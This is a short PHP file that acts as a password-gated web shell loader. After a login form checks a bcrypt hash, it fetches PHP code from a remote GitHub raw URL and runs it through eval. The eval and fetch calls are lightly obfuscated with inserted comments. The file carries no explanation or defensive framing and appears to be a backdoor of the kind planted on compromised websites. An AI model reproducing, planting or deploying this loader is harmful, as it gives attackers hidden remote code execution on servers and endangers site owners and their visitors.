<?php
session_start();

function show_login_page($message = "")
{
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body { font-family: monospace; text-align: center; margin-top: 20%; }
    input[type="password"] { border: none; border-bottom: 1px solid black; padding: 5px; }
    input[type="password"]:focus { outline: none; }
    input[type="submit"] { border: none; padding: 5px 20px; background-color: #2e313d; color: #FFF; cursor: pointer; }
    .message { color: red; margin-bottom: 10px; }
  </style>
</head>
<body>
  <form method="post">
    <?php if (!empty($message)) echo "<div class='message'>".htmlspecialchars($message)."</div>"; ?>
    <input type="password" name="pass" placeholder="Password"><br><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
<?php
exit;
}

function show_shell_page() {
    eval/**_**/(urldecode('%3f%3e') .
        file_get_contents/**_**/(urldecode/**_**/(
            'https://raw.githubusercontent.com/neurodie/hxc/refs/heads/main/rndm/mini_disablefunc.php'
        ))
    );
    exit;
}
$stored_hashed_password = '$2y$12$hN3rRYu1PB27GMhxsTcf0eF0l6xuw2P8pH4AQd2HFo2LIsqLjqH.S';

if (!isset($_SESSION['authenticated'])) {
    if (!empty($_POST['pass'])) {
        if (password_verify($_POST['pass'], $stored_hashed_password)) {
            $_SESSION['authenticated'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            show_login_page("Password salah!");
        }
    } else {
        show_login_page();
    }
} else {
    show_shell_page();
}
